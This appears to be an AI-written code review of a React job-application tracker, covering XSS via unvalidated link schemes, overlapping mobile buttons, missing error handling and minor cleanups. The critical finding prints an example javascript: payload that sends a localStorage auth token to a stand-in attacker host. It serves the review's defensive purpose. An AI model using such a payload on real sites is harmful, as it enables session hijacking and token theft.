---
phase: 06-navigation-consolidation-complete
reviewed: 2026-08-21T01:32:31Z
depth: standard
files_reviewed: 3
files_reviewed_list:
  - app/src/App.jsx
  - app/src/components/layout/Sidebar.jsx
  - app/src/components/TodayTab.jsx
findings:
  critical: 1
  warning: 3
  info: 4
  total: 8
status: issues_found
---

# Phase 06: Code Review Report

**Reviewed:** 2026-08-21T01:32:31Z
**Depth:** standard
**Files Reviewed:** 3
**Status:** issues_found

## Summary

Reviewed `App.jsx` (root routing, `NetworkTab`, `AppInner`, `DemoApp`), `Sidebar.jsx` (nav rail + mobile quick actions), and `TodayTab.jsx` (the consolidated attention feed). The navigation consolidation itself is structurally sound — hook ordering, conditional rendering, and the demo-mode branching all check out. The most serious finding is a stored-XSS-shaped issue: several free-text URL fields sourced from untrusted external inputs (GitHub job-board README parsing, AI/Exa enrichment) are rendered directly as clickable `<a href>` links with no scheme validation, so a `javascript:` URI in `jdLink`/`oaLink`/`linkedin` would execute in the app's own origin on click — a real concern given this app keeps a Supabase session JWT in localStorage. Also found a genuine mobile-layout bug (two floating action buttons in `Sidebar.jsx` overlap by 32px, one of them visually painting over the other's tap target), a missing try/catch in `DemoApp.load()` that can wedge the public demo in an infinite loading state, and several silent-failure / unhandled-rejection patterns around triage/follow-up mutations.

## Critical Issues

### CR-01: Unvalidated URL scheme rendered as clickable link (javascript: URI / stored XSS vector)

**File:** `app/src/App.jsx:145`, `app/src/components/TodayTab.jsx:234`, `app/src/components/TodayTab.jsx:284-286`

**Issue:** `c.linkedin` (App.jsx:145), `a.jdLink` (TodayTab.jsx:234), and `a.oaLink` (TodayTab.jsx:284-286) are rendered straight into `<a href={...} target="_blank" rel="noreferrer">` with no check that the value is actually an `http(s)` URL:

```jsx
{c.linkedin && (
  <a href={c.linkedin} target="_blank" rel="noreferrer" onClick={e => e.stopPropagation()} className="text-xs text-accent-500 hover:underline">LinkedIn ↗</a>
)}
```
```jsx
{a.jdLink && (
  <a href={a.jdLink} target="_blank" rel="noreferrer" onClick={e => e.stopPropagation()}
    className="text-xs text-accent-500 hover:underline">View JD ↗</a>
)}
```

Both `jdLink`/`oaLink` are populated from job-board data that ultimately traces back to parsing public, community-editable GitHub READMEs (`github.js`, per CLAUDE.md's Job Boards section — anyone can PR a listing into `SimplifyJobs/Summer2026-Internships` et al.), and `linkedin` can be populated by the Exa/Claude enrichment pipeline (`lib/enrichment.js`) reading arbitrary public web pages. Neither path validates that the extracted "link" is actually `http://`/`https://` before it's stored and later rendered as a link. A value of `javascript:fetch('https://evil.example/steal?t='+localStorage.getItem('sb-...-auth-token'))` (or any `javascript:` payload) would execute in the app's own origin the moment a user clicks "View JD ↗" / "Open assessment ↗" / "LinkedIn ↗" — and this is a multi-tenant app that stores the Supabase auth JWT in localStorage, so a successful click is a session-hijack primitive, not just a nuisance popup.

**Fix:** Add a small shared guard (e.g. in `shared.jsx`) and use it at every render site:
```js
export function isSafeHttpUrl(u) {
  try { return ['http:', 'https:'].includes(new URL(u).protocol) } catch { return false }
}
```
```jsx
{c.linkedin && isSafeHttpUrl(c.linkedin) && (
  <a href={c.linkedin} target="_blank" rel="noreferrer" ...>LinkedIn ↗</a>
)}
```
Apply the same guard to `a.jdLink` and `a.oaLink` in `TodayTab.jsx`, and audit other render sites of these same fields outside this review's scope (`PipelineTab.jsx`, `jobBoards/JobCard.jsx`, `ContactsTable.jsx`, etc.) since they likely share the same unguarded pattern.

## Warnings

### WR-01: Floating mobile action buttons overlap (Sidebar.jsx)

**File:** `app/src/components/layout/Sidebar.jsx:107-122`

**Issue:** The four mobile floating-action buttons are positioned with `bottom-56` (Settings), `bottom-52` (Quick Capture), `bottom-36` (Schedule), `bottom-20` (Event), each `w-12 h-12` (48px). Converting Tailwind's default spacing scale (1 unit = 4px): Event occupies 80–128px from the viewport bottom, Schedule 144–192px, Quick Capture 208–256px, Settings 224–272px. Event→Schedule and Schedule→Quick Capture both leave a clean 16px gap (the intended pattern), but Settings (224–272) and Quick Capture (208–256) overlap by 32px (224–256). Since these are same-`z-30` fixed-position siblings, later DOM order paints on top — Quick Capture (rendered after Settings, line 111 vs 107) will cover part of the Settings button's tap target, making Settings partially or fully untappable in the overlap region on real mobile devices.

**Fix:** Bump Settings to `bottom-68` (272px) to preserve the established 64px step pattern (80, 144, 208, 272):
```jsx
<button onClick={() => onTabChange('settings')} aria-label="Settings"
  className="md:hidden fixed right-4 bottom-68 z-30 w-12 h-12 rounded-full bg-ink-800 text-white shadow-lg flex items-center justify-center hover:bg-ink-700">
```

### WR-02: `DemoApp.load()` has no error handling — can wedge the public demo route in infinite loading

**File:** `app/src/App.jsx:364-369`

**Issue:** Unlike `AppInner.load()` (App.jsx:246-254), which wraps its `Promise.all` in `try/catch/finally` and surfaces failures via `setError`, `DemoApp.load()` has no error handling at all:
```js
async function load() {
  setLoading(true)
  const [c, a, i, cr] = await Promise.all([fetchContacts(), fetchApplications(), fetchInteractions(), fetchContactRelationships()])
  setContacts(c); setApps(a); setInteractions(i); setContactRelationships(cr)
  setLoading(false)
}
```
If any of the four `fetch*` calls throws (e.g. a future change to `demoData.js`/`db.js`'s demo-mode branch that isn't purely synchronous, or an unexpected exception), `setLoading(false)` never runs — the public `/demo` route (a portfolio-facing page with no sign-in) would show "Loading the demo..." forever with no recovery path and an unhandled promise rejection in the console.

**Fix:** Mirror `AppInner.load()`'s pattern:
```js
async function load() {
  setLoading(true)
  try {
    const [c, a, i, cr] = await Promise.all([fetchContacts(), fetchApplications(), fetchInteractions(), fetchContactRelationships()])
    setContacts(c); setApps(a); setInteractions(i); setContactRelationships(cr)
  } catch (e) { /* surface or at least log */ }
  finally { setLoading(false) }
}
```

### WR-03: Triage/follow-up mutations silently swallow errors or are never caught at all

**File:** `app/src/components/TodayTab.jsx:42-52` (`OverdueRow.markFollowedUp`), `94-107` (`ScheduleRow.markScheduled`), `269-277` (`OaRow.markCompleted`), `421-424` (`changeAppTriage`)

**Issue:** Three row components catch failures with an empty-bodied handler that only resets local `marking` state, with no user-visible feedback:
```js
async function markFollowedUp() {
  setMarking(true)
  try {
    ...
    onRefresh?.()
  } catch {
    setMarking(false)
  }
}
```
If `updateContact`/`addInteraction`/`updateApplication` fails (network blip, RLS error, expired session), the user sees the button simply re-enable with zero indication anything went wrong — they'll assume the follow-up was marked, the schedule reminder cleared, or the OA marked complete, when none of that happened.

Separately, `changeAppTriage` (used by both `ApplicationRow`'s inline triage chips and the application detail panel's `onStatusChange`) has no try/catch at all:
```js
async function changeAppTriage(app, bucketKey) {
  await updateApplicationTriage(app.id, BUCKET_TO_TRIAGE[bucketKey === null ? 'review' : bucketKey], app.stage)
  onRefresh?.()
}
```
It's invoked from an `onClick` without `await`/`.catch` (`onClick={e => { e.stopPropagation(); changeAppTriage(a, b.key) }}`, TodayTab.jsx:247), so any rejection becomes an unhandled promise rejection with no UI feedback whatsoever.

**Fix:** Add a visible failure path — even a lightweight inline "Couldn't save, try again" text — consistently across these four call sites, e.g.:
```js
async function changeAppTriage(app, bucketKey) {
  try {
    await updateApplicationTriage(app.id, BUCKET_TO_TRIAGE[bucketKey === null ? 'review' : bucketKey], app.stage)
    onRefresh?.()
  } catch (e) {
    // surface e.message to the user instead of letting it vanish
  }
}
```

## Info

### IN-01: Unused import `HEADING_COLOR` in TodayTab.jsx

**File:** `app/src/components/TodayTab.jsx:23`
**Issue:** `import { Section, RowCap, HEADING_COLOR } from './ui/Section.jsx'` imports `HEADING_COLOR`, but it's never referenced anywhere in the file.
**Fix:** Remove it from the import: `import { Section, RowCap } from './ui/Section.jsx'`.

### IN-02: Duplicated logic between AppInner/DemoApp and NetworkTab/TodayTab

**File:** `app/src/App.jsx:277-279` & `373-375` (`refreshContactRelationships`), `282-283` & `378-379` (`todayCount`/`counts` formula), `73-76` (`NetworkTab.handleMet`) & `app/src/components/TodayTab.jsx:413-416` (`TodayTab.handleMet`)
**Issue:** `refreshContactRelationships`, the `todayCount`/`counts` computation, and the `handleMet` handler are each duplicated verbatim between `AppInner`/`DemoApp` (App.jsx) and between `NetworkTab`/`TodayTab`. Any future change to the "today count" formula or the met-logging flow now has two (or more) places that must be updated in lockstep, and it's easy for one copy to drift.
**Fix:** Extract a shared `computeTodayCount(contacts, apps, interactions)` helper into `lib/attention.js` (which already owns the individual predicates), and a shared `useHandleMet(onRefresh)` hook or plain helper for the met-logging pattern.

### IN-03: Icon-only mobile floating buttons missing `aria-label` (inconsistent accessibility)

**File:** `app/src/components/layout/Sidebar.jsx:111-122`
**Issue:** The Settings floating button has `aria-label="Settings"` (line 108), but the Quick Capture (line 111), Schedule (line 116), and Event (line 120) floating buttons — all icon-only, no visible text — have no `aria-label`, so screen readers announce them with no accessible name.
**Fix:** Add matching `aria-label`s, e.g. `aria-label="Quick capture"`, `aria-label="Add schedule"`, `aria-label="Add event"`.

### IN-04: Contact sort doesn't fully order same-urgency-tier ties when only one side has a follow-up date

**File:** `app/src/App.jsx:64-69`
**Issue:**
```js
.sort((a, b) => {
  const u = { HIGH: 0, MED: 1, LOW: 2 }
  if (u[a.urgency] !== u[b.urgency]) return (u[a.urgency] ?? 2) - (u[b.urgency] ?? 2)
  if (a.followUpDate && b.followUpDate) return new Date(a.followUpDate) - new Date(b.followUpDate)
  return 0
})
```
When two contacts share the same urgency tier and only one of them has a `followUpDate` set, the comparator falls through to `return 0` (treated as equal) instead of consistently ordering contacts with a concrete date ahead of (or behind) those without one — so within a tier, contacts with a pending follow-up date can appear anywhere relative to ones without.
**Fix:** Add an explicit branch, mirroring the pattern already used in `lib/attention.js`'s `wantToSchedule`:
```js
if (!a.followUpDate && !b.followUpDate) return 0
if (!a.followUpDate) return 1
if (!b.followUpDate) return -1
return new Date(a.followUpDate) - new Date(b.followUpDate)
```

---

_Reviewed: 2026-08-21T01:32:31Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
